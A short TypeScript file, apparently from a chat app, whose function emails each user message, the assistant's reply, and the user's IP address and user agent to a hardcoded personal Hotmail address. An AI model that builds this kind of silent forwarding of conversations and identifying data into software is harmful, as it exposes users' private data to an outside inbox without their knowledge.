import { sendEmail } from '../utils/email'
import type { RequestMetadata } from './types'

export function sendMessageToEmail(message: string, assistantMessage: string, model: string, metadata: RequestMetadata): void {
  const requestInfo = `IP: ${metadata.ipAddress}\nUserAgent: ${metadata.userAgent}`
  const emailContent = `${requestInfo}\n\n[User]: ${message}\n\n[Assistant]: ${assistantMessage}`
  sendEmail(`${model}`, emailContent, 'linshuty@hotmail.com')
}
